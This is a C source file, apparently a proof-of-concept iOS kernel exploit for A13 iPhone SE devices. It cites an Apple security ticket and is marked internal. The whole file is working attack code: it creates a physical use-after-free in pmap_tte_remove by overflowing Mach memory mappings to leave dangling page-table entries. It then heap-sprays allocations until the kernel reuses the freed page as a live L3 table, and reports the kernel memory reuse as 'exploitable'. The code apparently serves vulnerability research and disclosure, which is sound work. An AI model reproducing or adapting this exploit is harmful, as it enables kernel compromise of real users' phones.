/*
 * pmap_spray_se.c — pmap_tte_remove PUAF + heap spray, SE (A13, no SPTM)
 *
 * Apple ticket: OE1105320204625
 *
 * A17/SPTM blocked heap spray because freed page goes to SPTM quarantine pool,
 * never enters pmap_pages_free_list. A13 has no SPTM — freed page goes directly
 * to pmap_pages_free_list. This test confirms whether spray hits on A13.
 *
 * Detection (3 possible results per maps[i] probe after spray):
 *   FAULT   (SIGSEGV) → L3 slot was zeroed by kernel when recycling page
 *                        = freed page was recycled as new L3 table (HIT)
 *   CHANGED (val != 0xDEA1DEAD && val != SENTINEL) → new kernel PTE written
 *                        = freed page was recycled, new PTE at this slot (HIT)
 *   SAME    (val == 0xDEA1DEAD) → page not yet recycled (MISS, retry)
 *
 * Compile on SE:
 *   clang-16 -isysroot /var/jb/usr/share/SDKs/iPhoneOS.sdk \
 *     -O2 -o pmap_spray_se pmap_spray_se.c && ldid -S pmap_spray_se
 *
 * Usage:
 *   ./pmap_spray_se              (512 spray, 1 attempt)
 *   ./pmap_spray_se -n 2048      (2048 spray)
 *   ./pmap_spray_se -r 10        (retry 10 times)
 *   ./pmap_spray_se -n 2048 -r 20
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <time.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#define OVERFLOW     65537
#define KEEP         64
#define PAGE_SZ      16384
#define SENTINEL     0x41
#define MAGIC_U32    0xDEA1DEADu
#define DEFAULT_N    512
#define DEFAULT_R    1

/* ─── Signal handler ─── */
static sigjmp_buf g_jmp;
static volatile int g_faulted;
static void sig_handler(int s) { g_faulted = 1; siglongjmp(g_jmp, 1); }

static int safe_read32(volatile void *addr, uint32_t *out) {
    g_faulted = 0;
    if (sigsetjmp(g_jmp, 1) == 0) { *out = *(volatile uint32_t *)addr; return 1; }
    return 0;
}

/* ─── Mach helpers ─── */
static mach_vm_address_t alloc_page(void) {
    mach_vm_address_t a = 0;
    if (mach_vm_allocate(mach_task_self(), &a, PAGE_SZ, VM_FLAGS_ANYWHERE) != KERN_SUCCESS)
        return 0;
    memset((void *)a, SENTINEL, PAGE_SZ);
    return a;
}

static kern_return_t make_entry(mach_vm_address_t b, mach_port_t *o) {
    mach_vm_size_t sz = PAGE_SZ;
    return mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_offset_t)b,
        VM_PROT_READ|VM_PROT_WRITE, o, MACH_PORT_NULL);
}

static kern_return_t map_entry(mach_port_t p, mach_vm_address_t *o) {
    *o = 0;
    return mach_vm_map(mach_task_self(), o, PAGE_SZ, 0, VM_FLAGS_ANYWHERE, p, 0,
        FALSE, VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE, VM_INHERIT_NONE);
}

static void flush(void) { fflush(stdout); }

/* ─── One spray attempt ─── Returns: >0 = hit, 0 = miss, -1 = error ─── */
static int spray_run(int attempt, int n_spray) {
    kern_return_t kr;
    printf("\n── attempt %d (spray=%d) ──────────────────────\n", attempt, n_spray);

    /* Phase 1: PUAF */
    mach_vm_address_t backing = alloc_page();
    if (!backing) { printf("[-] alloc_page\n"); return -1; }

    mach_port_t ep = MACH_PORT_NULL;
    if (make_entry(backing, &ep) != KERN_SUCCESS) {
        printf("[-] make_entry\n"); return -1;
    }

    mach_vm_address_t *maps = calloc(OVERFLOW, sizeof(mach_vm_address_t));
    if (!maps) { printf("[-] calloc\n"); return -1; }

    int created = 0;
    for (int i = 0; i < OVERFLOW; i++) {
        if (map_entry(ep, &maps[i]) != KERN_SUCCESS) break;
        created++;
    }
    int to_free = created - KEEP;
    if (to_free < 1) { printf("[-] not enough maps\n"); free(maps); return -1; }

    for (int i = created - 1; i >= KEEP; i--)
        mach_vm_deallocate(mach_task_self(), maps[i], PAGE_SZ);

    printf("  PUAF: %d maps, freed %d, %d dangling\n", created, to_free, KEEP);

    /* Phase 2: baseline write-through */
    int wt = 0;
    for (int i = 0; i < KEEP; i++) {
        volatile uint8_t *p = (volatile uint8_t *)maps[i];
        *p = 0xBB; wt += (*p == 0xBB) ? 1 : 0;
    }
    printf("  Baseline write-through: %d/%d\n", wt, KEEP);

    /* Phase 3: fill freed L3 page with MAGIC */
    volatile uint32_t *fp = (volatile uint32_t *)maps[0];
    for (int j = 0; j < (int)(PAGE_SZ / 4); j++) fp[j] = MAGIC_U32;

    uint32_t check = 0;
    int r = safe_read32((volatile void *)maps[0], &check);
    printf("  Mark: 0xDEA1DEAD fill  baseline-read=%s\n",
           r ? (check == MAGIC_U32 ? "0xDEA1DEAD [OK]" : "UNEXPECTED") : "FAULT");
    flush();

    /*
     * Phase 4: spray — VM_FLAGS_ANYWHERE lets kernel pick VAs.
     * On A13 (no SPTM), freed L3 page is in pmap_pages_free_list.
     * Each new touch in a different L3 window → pmap_tt_allocate → pmap_pages_alloc
     * → pulls our freed page off the list.
     *
     * On A13, VM addresses are packed more densely, so VM_FLAGS_ANYWHERE
     * naturally spreads across L3 windows better than on A17.
     * Using PAGE_SZ*2 allocation to straddle L3 boundaries when possible.
     */
    mach_vm_address_t *spray = calloc(n_spray, sizeof(mach_vm_address_t));
    if (!spray) { printf("[-] calloc spray\n"); free(maps); return -1; }

    int sprayed = 0;
    for (int i = 0; i < n_spray; i++) {
        mach_vm_address_t sa = 0;
        /* Allocate 2×PAGE_SZ to straddle an L3 boundary (32MB-aligned crossing) */
        if (mach_vm_allocate(mach_task_self(), &sa, PAGE_SZ * 2, VM_FLAGS_ANYWHERE)
            != KERN_SUCCESS) continue;
        volatile uint8_t *p = (volatile uint8_t *)sa;
        p[0] = 0xAB;                    /* touch first page */
        p[PAGE_SZ] = 0xAB;             /* touch second page — may be in new L3 window */
        spray[i] = sa;
        sprayed++;
    }
    printf("  Spray: %d/%d allocations\n", sprayed, n_spray);
    flush();

    /* Phase 5: probe */
    int faults = 0, unchanged = 0, changed = 0;
    for (int i = 0; i < KEEP; i++) {
        uint32_t val = 0;
        if (!safe_read32((volatile void *)maps[i], &val)) {
            faults++;
            if (faults == 1)
                printf("  [!] maps[%d] SIGSEGV — Translation Fault (L3 zeroed on recycle)\n", i);
        } else if (val == MAGIC_U32) {
            unchanged++;
        } else {
            changed++;
            if (changed <= 3)
                printf("  [?] maps[%d] = 0x%08x  (was 0xDEA1DEAD — new kernel PTE?)\n", i, val);
        }
    }

    printf("  Probe: faults=%d  unchanged=%d  changed=%d\n\n", faults, unchanged, changed);
    flush();

    int hit = faults + changed;

    if (hit > 0) {
        printf("  ★★★ HIT — freed L3 page was recycled by pmap_pages_alloc ★★★\n");
        printf("  faults=%d (slot zeroed on recycle)\n", faults);
        printf("  changed=%d (new kernel PTE written at slot)\n", changed);
        printf("  pmap_tte_remove UAF: freed page reused as live kernel L3 table.\n");
        printf("  Baseline write-through: %d/%d (dangling PTEs valid pre-spray)\n", wt, KEEP);
        printf("  VERDICT: exploitable kernel UAF with confirmed page reuse.\n");
    } else {
        printf("  Miss — freed page not yet reclaimed (unchanged=%d)\n", unchanged);
    }

    /* cleanup spray */
    for (int i = 0; i < n_spray; i++)
        if (spray[i]) mach_vm_deallocate(mach_task_self(), spray[i], PAGE_SZ * 2);
    free(spray);

    /* cleanup dangling PTEs (skip if faulted — they'll fault on unmap too) */
    if (faults == 0)
        for (int i = 0; i < KEEP; i++)
            mach_vm_deallocate(mach_task_self(), maps[i], PAGE_SZ);
    free(maps);
    mach_port_deallocate(mach_task_self(), ep);
    mach_vm_deallocate(mach_task_self(), backing, PAGE_SZ);

    return hit;
}

int main(int argc, char *argv[]) {
    int n_spray  = DEFAULT_N;
    int n_retry  = DEFAULT_R;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-n") && i+1 < argc) n_spray = atoi(argv[++i]);
        if (!strcmp(argv[i], "-r") && i+1 < argc) n_retry = atoi(argv[++i]);
    }

    struct sigaction sa; memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sig_handler; sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL); sigaction(SIGBUS, &sa, NULL);

    printf("pmap_spray_se — A13 heap spray test\n");
    printf("OE1105320204625 — INTERNAL ONLY\n");
    printf("spray=%d  retry=%d  pid=%d\n", n_spray, n_retry, getpid());
    flush();

    int total_hits = 0;
    for (int attempt = 1; attempt <= n_retry; attempt++) {
        int r = spray_run(attempt, n_spray);
        if (r < 0) { printf("[-] fatal error\n"); break; }
        if (r > 0) { total_hits++; break; }
        if (attempt < n_retry) usleep(100000);
    }

    printf("\n══════════════════════════════════════════\n");
    printf("TOTAL HITS: %d\n", total_hits);
    if (total_hits > 0)
        printf("RESULT: A13 heap spray works — pmap_pages_alloc recycles freed L3 page.\n"
               "        This confirms the full exploitation chain on non-SPTM hardware.\n");
    else
        printf("RESULT: Spray miss on A13 — unexpected. Try -n 2048 -r 20.\n");
    printf("══════════════════════════════════════════\n");
    return total_hits > 0 ? 0 : 1;
}
